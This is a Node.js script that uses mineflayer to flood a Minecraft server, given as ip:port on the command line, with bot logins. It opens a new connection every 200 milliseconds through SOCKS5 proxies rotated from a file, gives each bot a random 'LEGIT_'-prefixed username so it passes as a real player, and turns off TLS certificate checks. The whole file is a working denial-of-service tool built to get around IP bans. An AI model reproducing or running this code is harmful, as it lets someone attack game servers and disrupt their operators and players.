process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0'
const args = process.argv.slice(2)
const fs = require('fs');
const socks = require('socks').SocksClient
const ProxyAgent = require('proxy-agent')
let proxies = fs.readFileSync('socks5.txt', 'utf-8').split('\n');

var theproxy = 0;
let ip = args[0].split(':')[0]
let port = args[0].split(':')[1]
let ver = args[1]
let interval = 200

var mineflayer = require('mineflayer');
setInterval(() => {
theproxy++
var proxy = proxies[theproxy];
proxy = proxy.split(':');
proxyip = proxy[0];
proxyport = proxy[1];
var bot = mineflayer.createBot({
      connect: client => {
        socks.createConnection({
          proxy: {
            host: proxyip,
            port: parseInt(proxyport),
            type: 5
          },
          command: 'connect',
          destination: {
            host: ip,
            port: parseInt(port)
          }
        }, (err, info) => {
          if (err) {
            return
          }

          client.setSocket(info.socket)
          client.emit('connect')
        })
      },
      agent: new ProxyAgent({ protocol: 'socks5:', host: proxyip, port: proxyport }),
      username: "LEGIT_" + makeid(10),
      version: ver
})



bot.on('login', () => {
        console.log(bot.username + " connected") 
        bot.quit()
    });
bot.on('error', err => console.log(err))
    bot.on('kicked', function(reason) {
        console.log("Kicked " + bot.username + " " + reason);
    });

}, interval)




function makeid(length) {
    var result           = '';
    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
      result += characters.charAt(Math.floor(Math.random() * 
 charactersLength));
   }
   return result;
}